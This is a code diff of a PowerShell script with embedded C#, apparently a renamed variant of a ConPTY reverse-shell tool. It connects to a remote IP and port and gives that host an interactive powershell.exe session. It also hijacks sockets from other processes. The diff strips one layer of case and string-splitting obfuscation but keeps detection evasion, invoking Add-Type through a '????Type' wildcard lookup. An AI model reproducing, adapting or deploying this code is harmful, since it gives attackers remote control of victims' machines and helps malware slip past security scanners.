@@ -1,54 +1,54 @@
-function InvokE-cpTSH
+function Invoke-CPTSH
 {   
     
     Param
     (
-        [PaRAmEtER(POsItION = 0)]
-        [StrinG]
-        $rip,
+        [Parameter(Position = 0)]
+        [String]
+        $RIP,
         
-        [paRamEtEr(POSItiON = 1)]
-        [STRING]
-        $Rp,
+        [Parameter(Position = 1)]
+        [String]
+        $RP,
 
-        [parAMETER()]
-        [sTRiNG]
+        [Parameter()]
+        [String]
         $RW = "24",
 
-        [PArAMetEr()]
-        [striNG]
-        $cLs = "80",
+        [Parameter()]
+        [String]
+        $CLS = "80",
 
-        [parameTEr()]
-        [StRinG]
-        $cl = "powershell.exe",
+        [Parameter()]
+        [String]
+        $CL = "powershell.exe",
         
-        [pARAmEteR()]
+        [Parameter()]
         [Switch]
-        $UPg
+        $UPG
     )
     
-    if( $PsBOUNdpAraMeTERS.coNtaiNSKey('UPG') ) {
-        $rip = "UPG"
+    if( $PSBoundParameters.ContainsKey('UPG') ) {
+        $RIP = "UPG"
         $RP = "shell"
     }
     else{
   
-        if(-Not($PSBounDPARamETERS.CoNTAInskEY('RIP'))) {
+        if(-Not($PSBoundParameters.ContainsKey('RIP'))) {
             throw "RIP missing parameter"
         }
         
-        if(-Not($PsbouNdPaRamETers.conTainskey('RP'))) {
+        if(-Not($PSBoundParameters.ContainsKey('RP'))) {
             throw "RP missing parameter"
         }
     }
-    $PARaMETERSCpTSH = @($rIP, $Rp, $RW, $clS, $CL)
-    &('AdD-tYp'+'e') -TYpEdeFInITion $SOURce -lAngUAGE cSHaRP;
-    $ouTpUT = [CpTSHMAINclaSS]::CptSHmain($PARaMeTErscPtsh)
-    wRITe-OuT`pUT $oUTPUt
+    $parametersCPTSH = @($RIP, $RP, $RW, $CLS, $CL)
+    & (Get-Command '????Type' -CommandType Function, Cmdlet -ErrorAction SilentlyContinue)[0] -TypeDefinition $Source -Language CSharp;
+	$output = [CPTSHMainClass]::CPTSHMain($parametersCPTSH)
+    Write-Output $output
 }
 
-$SoUrce = @"
+$Source = @"
 
 using System;
 using System.IO;
@@ -63,7 +63,7 @@ using System.Collections.Generic;
 
 public class CPTSHException : Exception
 {
-    private const string error_string = "[-] CpTsHeXcePtIOn: ";
+    private const string error_string = "[-] CPTSHException: ";
 
     public CPTSHException() { }
 
@@ -78,13 +78,13 @@ public class DeadlockCheckHelper
 
     private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);
 
-    [DllImport("KeRneL32.dLl")]
+    [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("KErnEL32.Dll", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-    [DllImport("keRNEL32.dLL", SetLastError = true)]
+    [DllImport("Kernel32.dll", SetLastError = true)]
     private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 
     private uint ThreadCheckDeadlock(uint threadParams)
@@ -106,7 +106,7 @@ public class DeadlockCheckHelper
         //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
         hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
         WaitForSingleObject(hThread, 1500);
-        //we do not kill the "pEndING" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
+        //we do not kill the "pending" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
         //just some waste of threads :(
         CloseHandle(hThread);
         return this.deadlockDetected;
@@ -393,58 +393,58 @@ public static class SocketHijacking
     }
 
 
-    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);
 
-    [DllImport("Ws2_32.dLL", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);
 
-    [DllImport("ws2_32.dLl", CharSet = CharSet.Auto)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     private static extern Int32 WSAGetLastError();
 
-    [DllImport("wS2_32.dLl", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
 
     // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
-    [DllImport("wS2_32.DLl", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "wsaiOCTl")]
+    [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
     public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
 
-    [DllImport("Ws2_32.DLl", CharSet = CharSet.Unicode, SetLastError = true)]
+    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern int closesocket(IntPtr s);
 
-    [DllImport("kErNeL32.dlL", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
 
-    [DllImport("KERNeL32.dLL", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
 
-    [DllImport("KerNEL32.DLl")]
+    [DllImport("kernel32.dll")]
     private static extern bool CloseHandle(IntPtr hObject);
 
-    [DllImport("kERNEL32.dLl")]
+    [DllImport("kernel32.dll")]
     private static extern IntPtr GetCurrentProcess();
 
-    [DllImport("NTdLL.DlL")]
+    [DllImport("ntdll.dll")]
     private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);
 
-    [DllImport("ntDll.dLl")]
+    [DllImport("ntdll.dll")]
     private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
 
-    [DllImport("keRNeL32.DlL", SetLastError = true)]
+    [DllImport("kernel32.dll", SetLastError = true)]
     private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
-    [DllImport("NTdLl.dLl")]
+    [DllImport("ntdll.dll")]
     private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);
 
     // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
-    [DllImport("NTdll.dll", EntryPoint = "nTdeviCeiocOntROLFilE")]
+    [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
     private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
 
-    [DllImport("WS2_32.DLL")]
+    [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
     
-    //helper method with "DYnamIc" buffer allocation
+    //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -459,7 +459,7 @@ public static class SocketHijacking
             Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
             if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
             {
-                //throw new Exception("UNhANdlEd &('Ntstatu'+'S') " + result);
+                //throw new Exception("Unhandled NtStatus " + result);
                 return IntPtr.Zero;
             }
             infoPtr = Marshal.AllocHGlobal(infoLength);
@@ -479,7 +479,7 @@ public static class SocketHijacking
         return (((address) + (align) - 1) & ~((align) - 1));
     }
 
-    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "WAy" of counting index types.
+    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
     // credits for this goes to @0xrepnz
     // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
     private static byte GetTypeIndexByName(string ObjectName)
@@ -533,7 +533,7 @@ public static class SocketHijacking
                 closesocket(sock);
                 continue;
             }
-            // Console.WriteLine("DEBuG: &("SOCk"+"Et") &('HAnd'+'LE') 0x" + sock.ToString("X4") + " is in &('tCPsTat'+'E') " + sockInfo.State.ToString());
+            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
             // we need only active sockets, the remaing sockets are filtered out
             if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
             {
@@ -552,7 +552,7 @@ public static class SocketHijacking
         foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
         {
             socketsOut.Add(sockBytesIn.handle);
-            // Console.WriteLine("dEbug: &("SOCK"+"ET") &("HANDL"+"E") 0X" + sockBytesIn.handle.ToString("x4") + " Tota`l b`yTEs &("rec"+"eiVed"): " + sockBytesIn.BytesIn.ToString());
+            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
         }
         return socketsOut;
     }
@@ -567,7 +567,7 @@ public static class SocketHijacking
         result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
         if (result != 0)
         {
-            // Console.WriteLine("DebuG: WSa`Ioctl1 &('FA'+'ILED') &('w'+'itH') return co`de " + result.ToString() + " and &("Wsa"+"laSTerroR"): " + WSAGetLastError().ToString());
+            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
             tcpInfoOut = new TCP_INFO_v0();
             return false;
         }
@@ -1425,7 +1425,7 @@ public static class CPTSH
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
-                            throw new CPTSHException("no \\deVIce\\AFD &("OBJ"+"ECts") &("FOun"+"d"). sOckEt &("Dup"+"LICATIon") faI`LEd.");
+                            throw new CPTSHException("No \\Device\\Afd objects found. Socket duplication failed.");
                         }
                         else
                         {
@@ -1451,7 +1451,7 @@ public static class CPTSH
                 shellSocket = connectRemote(RIP, RP);
                 if (shellSocket == IntPtr.Zero)
                 {
-                    output += string.Format("{0}COUld not &('CoNn'+'ect') tO ip {1} oN &("p"+"oRT") {2}", errorString, RIP, RP.ToString());
+                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, RIP, RP.ToString());
                     return output;
                 }
                 TryParseRWCLSFromSocket(shellSocket, ref RW, ref CLS);
@@ -1463,13 +1463,13 @@ public static class CPTSH
                 newConsoleAllocated = true;
             }
             // debug code for checking handle duplication
-            // Console.WriteLine("deBUG: &('CREa'+'tINg') &("PsE"+"UdO") &('coNSo'+'lE')...");
+            // Console.WriteLine("debug: Creating pseudo console...");
             // Thread.Sleep(180000);
             // return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, RW, CLS);
             if (pseudoConsoleCreationResult != 0)
             {
-                output += string.Format("{0}CouLD not &('Cr'+'eAte') &('Ps'+'UedO') &('CoN'+'solE'). errOr &("COd"+"E") {1}", errorString, pseudoConsoleCreationResult.ToString());
+                output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                 return output;
             }
             childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, CL);
@@ -1478,16 +1478,16 @@ public static class CPTSH
         {
             if (UPGShell)
             {
-                output += string.Format("cOUld not &('u'+'Pg') &('s'+'hEll') tO &("F"+"UlLy") &('iNtERAct'+'IvE') &("bEc"+"AusE") &("cOn"+"pTY") is not &('cOMpAt'+'IbLE') oN &("t"+"HiS") &("syS"+"tEm")");
+                output += string.Format("Could not UPG shell to fully interactive because ConPTY is not compatible on this system");
                 return output;
             }
             shellSocket = connectRemote(RIP, RP);
             if (shellSocket == IntPtr.Zero)
             {
-                output += string.Format("{0}CoUlD not &("COn"+"neCt") To ip {1} oN &('p'+'Ort') {2}", errorString, RIP, RP.ToString());
+                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, RIP, RP.ToString());
                 return output;
             }
-            Console.WriteLine("\r\NCreAtepsEUdOConSolE function not F`OUnd! &("sPawnI"+"NG") A neTcAT-Like intERActivE &("sHE"+"ll")...\R\n");
+            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
             STARTUPINFO sInfo = new STARTUPINFO();
             sInfo.cb = Marshal.SizeOf(sInfo);
             sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
